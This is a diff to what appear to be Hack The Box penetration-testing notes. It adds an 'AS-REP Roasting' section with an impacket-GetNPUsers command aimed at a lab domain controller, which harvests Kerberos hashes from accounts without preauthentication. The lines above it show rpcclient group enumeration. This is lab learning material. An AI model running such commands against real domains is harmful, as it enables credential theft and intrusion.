@@ -196,3 +196,13 @@ rpcclient $> querygroup 0x47c
         Num Members:1
 ```
 ![image](https://user-images.githubusercontent.com/83878909/231127882-51b87c41-6484-4f19-92ac-16b225f230ff.png)
+
+---
+
+## AS-REP Roasting
+  - ``: Get users who not require Kerberos preauthentication.
+```CSS
+▶ impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt
+```
+![image](https://user-images.githubusercontent.com/83878909/231133087-8e74b0d1-716c-4184-9169-9a5236ebe78e.png)
+
